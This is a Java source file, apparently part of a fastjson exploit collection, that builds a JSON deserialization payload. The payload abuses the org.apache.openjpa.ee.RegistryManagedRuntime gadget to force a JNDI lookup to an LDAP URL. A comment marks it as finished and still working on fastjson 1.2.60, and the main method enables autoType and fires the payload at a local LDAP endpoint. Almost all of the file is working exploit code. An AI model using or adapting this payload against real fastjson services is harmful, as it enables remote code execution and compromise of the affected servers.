package fastjsonExp;

import org.apache.openjpa.ee.RegistryManagedRuntime;
import utils.FastjsonVersionCtr;
import utils.StringUtils;
import java.lang.Runtime;

/**
 * 已完成
 * org.apache.openjpa.ee
 * still work at fastjson 1.2.60
 */
public class EXP4openjpa {


    public String JNDI_URL = "";
    public String payload = "{\"@type\":\"org.apache.openjpa.ee.RegistryManagedRuntime\",\"_registryName\":\"replace_here\",\"rollbackOnly\": null}";
    public  void actual_fun(String url) throws Exception {
        //RegistryManagedRuntime registryManagedRuntime = new RegistryManagedRuntime();
        //registryManagedRuntime.setRegistryName(url);
        //registryManagedRuntime.getTransactionManager();
        //JNDIManagedRuntime jndiManagedRuntime = new JNDIManagedRuntime();
        //jndiManagedRuntime.setTransactionManagerName(url);
        //jndiManagedRuntime.getTransactionManager();

    }
    public  void actual_fun() throws Exception {
        if(!StringUtils.isNull(this.JNDI_URL)){
            this.actual_fun(this.JNDI_URL);
        }
    }
    public EXP4openjpa(){}
    public EXP4openjpa(String uri){
        this.JNDI_URL = uri;
        //String encodeUri = Base64.encodeToString(uri.getBytes());
        this.payload = this.payload.replace("replace_here",uri);

    }
    public String getPayload(){
        System.out.println(this.payload);
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.60");
        myFastjson.mySetAutoType(true);
        EXP4openjpa exp = new EXP4openjpa("ldap://127.0.0.1:1389/run");
        myFastjson.myParseObject(exp.getPayload());
        //exp.actual_fun();
        myFastjson.clear();

    }


}
